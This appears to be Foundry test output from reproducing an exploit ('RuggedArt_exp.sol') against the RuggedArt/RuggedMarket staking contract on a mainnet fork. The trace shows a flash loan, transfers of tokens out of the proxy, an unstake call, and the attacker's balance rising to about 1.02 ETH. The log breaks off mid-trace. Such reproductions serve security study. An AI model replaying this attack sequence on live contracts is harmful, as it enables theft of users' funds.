No files changed, compilation skipped

Ran 1 test for test/RuggedArt_exp.sol:ContractTest
[PASS] testExploit() (gas: 7102116)
Logs:
  Attacker Eth balance before attack:: 0
  Attacker Eth balance after attack:: 1023851896415447765

Traces:
  [19491] ContractTest::setUp()
    ├─ [0] VM::createSelectFork("mainnet", 19262233 [1.926e7])
    │   └─ ← [Return] 0
    ├─ [0] VM::label(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], "proxy")
    │   └─ ← [Return]
    ├─ [0] VM::label(RUGGED: [0xbE33F57f41a20b2f00DEc91DcC1169597f36221F], "RUGGED")
    │   └─ ← [Return]
    ├─ [0] VM::label(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], "pool")
    │   └─ ← [Return]
    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
    │   └─ ← [Return]
    ├─ [0] VM::label(RuggedMarket: [0xFe380fe1DB07e531E3519b9AE3EA9f7888CE20C6], "RuggedMarket")
    │   └─ ← [Return]
    ├─ [0] VM::label(Universal_Router: [0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD], "Universal_Router")
    │   └─ ← [Return]
    └─ ← [Stop]

  [8882910] ContractTest::testExploit()
    ├─ [2534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] 0x0000000000000000000000000000000000000000::fallback()
    │   └─ ← [Stop]
    ├─ [0] VM::deal(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1)
    │   └─ ← [Return]
    ├─ [534] WETH::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "Attacker Eth balance before attack:", val: 0)
    ├─ [8216165] pool::flash(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19], 0, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ [2630] RUGGED::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 356565570739218611936 [3.565e20]
    │   ├─ [2534] WETH::balanceOf(pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]) [staticcall]
    │   │   └─ ← [Return] 21357138155001948655 [2.135e19]
    │   ├─ [2315335] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19])
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9159)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9004)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3270)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8866)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 347)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9050)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3033)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 41)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7485)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9192)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 1933)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9017)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7093)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4090)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3525)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3978)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4984)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7449)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 3913)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6049)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8796)
    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4903)
    │   │   ├─ emit ERC20Transfer(from: pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 22000000000000000000 [2.2e19])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 12 → 13
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e7: 7859 → 0
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 521 → 520
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d98: 0 → 8298
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000a688906bd8b00000 → 0x000000000000000000000000000000000000000000000000b469471f80140000
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c4a1376670e5e8a41 → 0x00000000000000000000000000000000000000000000001c3c32bfb366fa8a41
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606c4: 8298 → 7859
    │   │   │   │   │   │   @ 0x852ad12a00fde3f2222effa6c54953732fa0c605b80022916d85aabff4788b60: 520 → 485
    │   │   │   │   │   │   @ 0x6e371ab298d0c967d21204d9cdbf6c8cb65922083ca8f8a9f108502074c2fde5: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x8f2552b79692e047edc9e936c597204f5f37dd6b1f82511ddcc9274c9b87c401: 485 → 12
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4825)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4825)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000b469471f80140000 → 0x000000000000000000000000000000000000000000000000c249fdd327780000
    │   │   │   │   │   │   @ 0xcca05c8af9cc32c65ebff8406e489e0983b1e51968f66b29cda56497843c7da7: 470 → 13
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 520 → 519
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d99: 0 → 4825
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 13 → 14
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e6: 6356 → 0
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606b5: 4825 → 6356
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c3c32bfb366fa8a41 → 0x00000000000000000000000000000000000000000000001c2e5208ffbf968a41
    │   │   │   │   │   │   @ 0x53dcf6523203eeda256c1c1448097d0049bd45fee760a74a01dbe05dbc1d65e9: 519 → 470
    │   │   │   │   │   │   @ 0x5d33b97014764403556a041289e1b829afd50b25dbb655fd0f30ffd733fb45f4: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9307)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 9307)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c2e5208ffbf968a41 → 0x00000000000000000000000000000000000000000000001c2071524c18328a41
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606c9: 9307 → 2507
    │   │   │   │   │   │   @ 0x135cf6d18023edee06366a283ef957c17bc8b8cfaac068cc23d9db87ba8679d1: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 519 → 518
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 14 → 15
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000c249fdd327780000 → 0x000000000000000000000000000000000000000000000000d02ab486cedc0000
    │   │   │   │   │   │   @ 0x2a8efdb7eb99fec03e881c964da846b7ab8695cb9d012a1b34c4ed2e3b70bdc8: 518 → 490
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9a: 0 → 9307
    │   │   │   │   │   │   @ 0x256f28a6cf5b51dfe30a7eb91f0d1b5def2a468611a6719352d94523d4142c40: 490 → 14
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e5: 2507 → 0
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2628)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 2628)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000d02ab486cedc0000 → 0x000000000000000000000000000000000000000000000000de0b6b3a76400000
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606ae: 2628 → 4842
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e4: 4842 → 0
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c2071524c18328a41 → 0x00000000000000000000000000000000000000000000001c12909b9870ce8a41
    │   │   │   │   │   │   @ 0xe86a36d99c620136f888a1fd93be80f03b128dd47d208a7926fccc1281ec5638: 517 → 463
    │   │   │   │   │   │   @ 0xa2133436b58a260f8d006c27fb45bb008e0a093024f113527ab0cae7cf6546f5: 463 → 15
    │   │   │   │   │   │   @ 0x2b61c6014dd1218b919a2b632c5dcc2a61bdde548433a800da90f716b805a9ac: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 518 → 517
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 15 → 16
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9b: 0 → 2628
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6115)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 6115)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e3: 8137 → 0
    │   │   │   │   │   │   @ 0xb0ec549f98926cc0f4ede0edd2042cf2df3d2301ffcaff963552b32db760c658: 478 → 16
    │   │   │   │   │   │   @ 0x49a5885a350910d8cf696d3029d168cbf7f45629acb2ca670894878590048e18: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 517 → 516
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c12909b9870ce8a41 → 0x00000000000000000000000000000000000000000000001c04afe4e4c96a8a41
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000de0b6b3a76400000 → 0x000000000000000000000000000000000000000000000000ebec21ee1da40000
    │   │   │   │   │   │   @ 0x35441fe7f8d0b19a83bd87b7e969450f401b3ab7732f1b720b32640769eccc25: 516 → 478
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606bd: 6115 → 8137
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 16 → 17
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9c: 0 → 6115
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8565)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 8565)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x2f3a8ebe6e3a27c6a100d98d2ff91774a5b5385d01543103ad054dd5f6762dc5: 515 → 10
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000ebec21ee1da40000 → 0x000000000000000000000000000000000000000000000000f9ccd8a1c5080000
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e2: 5153 → 0
    │   │   │   │   │   │   @ 0x9a69d1e9401edab34a51f000f56e3ed9803e0fac3ef672554259888b014940d5: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604e9: 8565 → 5153
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 516 → 515
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 17 → 18
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9d: 0 → 8565
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001c04afe4e4c96a8a41 → 0x00000000000000000000000000000000000000000000001bf6cf2e3122068a41
    │   │   │   │   │   │   @ 0x1aa357a72ac6cef8a628616782ff99e86fb3930371d27c8f70f7aa9e81dbf9db: 10 → 17
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7991)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 7991)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604e7: 7991 → 1168
    │   │   │   │   │   │   @ 0x248e9cd0385669887fa0db5e4efd97493422503ac37886170ad4f5ed3c7bc90a: 514 → 8
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e1: 1168 → 0
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001bf6cf2e3122068a41 → 0x00000000000000000000000000000000000000000000001be8ee777d7aa28a41
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 18 → 19
    │   │   │   │   │   │   @ 0x5e32d5a093587ea83172d78e4cf06f0f12106514810a73d0f00754720c616eba: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x6fb6557de3395141aa9888cf395b4ffde37db51885d9441c1ec68fa29c9426c1: 8 → 18
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000000f9ccd8a1c5080000 → 0x00000000000000000000000000000000000000000000000107ad8f556c6c0000
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 515 → 514
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9e: 0 → 7991
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [46322] RUGGED::transferFrom(proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4945)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], tokenId: 4945)
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 1000000000000000000 [1e18])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x8da61f0ba95efa75981093b7e981f31c2521cefb7e27bcc5d8d4ec9d256a89ec: 21 → 19
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c606e0: 5045 → 0
    │   │   │   │   │   │   @ 0x7411920289acc0478c8983ea9888d5437178bb279dc677182093adc192efcb94: 514 → 513
    │   │   │   │   │   │   @ 0x8ade9df877cb80af548f38370331a164b97518ec72222059c8aaf19e6dec14c1: 513 → 21
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x00000000000000000000000000000000000000000000000107ad8f556c6c0000 → 0x000000000000000000000000000000000000000000000001158e460913d00000
    │   │   │   │   │   │   @ 0x03b8273c0fd106a7a9637c2a20dc87aedebcb455453ae991e59726e2eaaf2d9f: 0 → 4945
    │   │   │   │   │   │   @ 0x48dd8d21eb66092b5011858cd63de145f4b1a9f5ca695c3ddfa8fa7b24091d97: 0x0000000000000000000000002648f5592c09a260c601acde44e7f8f2944944fb → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
    │   │   │   │   │   │   @ 0x511b40854087f8c0f1a9093cb435e67cbca476488c8d69f592d303a788c604f4: 4945 → 5045
    │   │   │   │   │   │   @ 0x2693936b7dd26548888d070d1ff4ae2403b4eb4731226afcaca7ee5f3fcb35a1: 19 → 20
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001be8ee777d7aa28a41 → 0x00000000000000000000000000000000000000000000001bdb0dc0c9d33e8a41
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─  storage changes:
    │   │   │   │   │   @ 5: 0 → 0x0000000000000000000000000000000000000000000000001bc16d674ec80000
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   ├─ [630] RUGGED::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 20000000000000000000 [2e19]
    │   │   ├─ [2233086] proxy::unstake(20000000000000000000 [2e19])
    │   │   │   ├─ [2232696] RuggedMarket::unstake(20000000000000000000 [2e19]) [delegatecall]
    │   │   │   │   ├─ [4904] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 82421081864000000 [8.242e16])
    │   │   │   │   │   ├─ emit ERC20Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount: 82421081864000000 [8.242e16])
    │   │   │   │   │   ├─  storage changes:
    │   │   │   │   │   │   @ 0x0c686c6542b3529edbf466c24ab1e9df2d3654e7bbbf363aa7807608987827ca: 0x00000000000000000000000000000000000000000000001bdb0dc0c9d33e8a41 → 0x00000000000000000000000000000000000000000000001bd9e8ef4048bcb841
    │   │   │   │   │   │   @ 0x3707462b181da5757afb393000713f9d89955f52c38cceeebf01e0b050d6ff3e: 0x000000000000000000000000000000000000000000000001158e460913d00000 → 0x00000000000000000000000000000000000000000000000116b317929e51d200
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [2215934] RUGGED::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20000000000000000000 [2e19])
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 643)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 358)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 9264)
    │   │   │   │   │   ├─ emit Transfer(from: proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], to: 0x0000000000000000000000000000000000000000, tokenId: 338)
